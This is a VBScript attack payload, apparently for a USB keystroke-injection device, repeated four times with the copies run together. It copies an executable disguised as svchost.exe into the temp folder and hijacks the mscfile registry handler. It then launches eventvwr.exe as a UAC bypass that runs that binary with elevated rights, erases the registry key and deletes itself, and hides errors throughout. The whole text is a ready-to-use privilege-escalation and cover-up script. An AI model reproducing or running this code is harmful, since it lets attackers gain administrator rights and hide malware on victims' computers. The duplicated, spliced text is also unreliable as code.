Sub Main()
'Move file from ducky to local temp folder
	CreateObject("Scripting.FilesystemObject").CopyFile Left(WScript.ScriptFullName, InStrRev(WScript.ScriptFullName, "\")) + "svchost.exe",  CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) + "\svchost.exe"

'Write UAC bypass regkey
	CreateObject("WScript.Shell").RegWrite "HKCU\Software\Classes\mscfile\shell\open\command\", CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) +"\svchost.exe" ,"REG_SZ"
	
'Trigger UAC bypass
	CreateObject("WScript.Shell").Run("eventvwr.exe"),0,true
	
'Reset regkey 
	GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & "." & "\root\default:StdRegProv").DeleteValue &H80000001,"Software\Classes\mscfile\shell\open\command\",""
	'Remove this script

	CreateObject("WScript.Shell").Run "cmd /c del " + WScript.ScriptFullName, 0, False
End Sub 
'Dont wanna display shit
On Error Resume Next

  Main


  If Err.Number Then

     'on error cleanup and exit

	CreateObject("WScript.Shell").Run "cmd /c del " + WScript.ScriptFullName, 0, False

     WScript.Quit 4711

End IfSub Main()
'Move file from ducky to local temp folder
	CreateObject("Scripting.FilesystemObject").CopyFile Left(WScript.ScriptFullName, InStrRev(WScript.ScriptFullName, "\")) + "svchost.exe",  CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) + "\svchost.exe"

'Write UAC bypass regkey
	CreateObject("WScript.Shell").RegWrite "HKCU\Software\Classes\mscfile\shell\open\command\", CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) +"\svchost.exe" ,"REG_SZ"
	
'Trigger UAC bypass
	CreateObject("WScript.Shell").Run("eventvwr.exe"),0,true
	
'Reset regkey 
	GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & "." & "\root\default:StdRegProv").DeleteValue &H80000001,"Software\Classes\mscfile\shell\open\command\",""
	'Remove this script

	CreateObject("WScript.Shell").Run "cmd /c del " + WScript.ScriptFullName, 0, False
End Sub 
'Dont wanna display shit
On Error Resume Next

  Main


  If Err.Number Then

     'on error cleanup and exit

	CreateObject("WScript.Shell").Run "cmd /c del " + WScript.ScriptFullName, 0, False

     WScript.Quit 4711

End IfSub Main()
'Move file from ducky to local temp folder
	CreateObject("Scripting.FilesystemObject").CopyFile Left(WScript.ScriptFullName, InStrRev(WScript.ScriptFullName, "\")) + "svchost.exe",  CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) + "\svchost.exe"

'Write UAC bypass regkey
	CreateObject("WScript.Shell").RegWrite "HKCU\Software\Classes\mscfile\shell\open\command\", CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) +"\svchost.exe" ,"REG_SZ"
	
'Trigger UAC bypass
	CreateObject("WScript.Shell").Run("eventvwr.exe"),0,true
	
'Reset regkey 
	GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & "." & "\root\default:StdRegProv").DeleteValue &H80000001,"Software\Classes\mscfile\shell\open\command\",""
	'Remove this script

	CreateObject("WScript.Shell").Run "cmd /c del " + WScript.ScriptFullName, 0, False
End Sub 
'Dont wanna display shit
On Error Resume Next

  Main


  If Err.Number Then

     'on error cleanup and exit

	CreateObject("WScript.Shell").Run "cmd /c del " + WScript.ScriptFullName, 0, False

     WScript.Quit 4711

End IfSub Main()
'Move file from ducky to local temp folder
	CreateObject("Scripting.FilesystemObject").CopyFile Left(WScript.ScriptFullName, InStrRev(WScript.ScriptFullName, "\")) + "svchost.exe",  CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) + "\svchost.exe"

'Write UAC bypass regkey
	CreateObject("WScript.Shell").RegWrite "HKCU\Software\Classes\mscfile\shell\open\command\", CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) +"\svchost.exe" ,"REG_SZ"
	
'Trigger UAC bypass
	CreateObject("WScript.Shell").Run("eventvwr.exe"),0,true
	
'Reset regkey 
	GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & "." & "\root\default:StdRegProv").DeleteValue &H80000001,"Software\Classes\mscfile\shell\open\command\",""
	'Remove this script

	CreateObject("WScript.Shell").Run "cmd /c del " + WScript.ScriptFullName, 0, False
End Sub 
'Dont wanna display shit
On Error Resume Next

  Main


  If Err.Number Then

     'on error cleanup and exit

	CreateObject("WScript.Shell").Run "cmd /c del " + WScript.ScriptFullName, 0, False

     WScript.Quit 4711

End If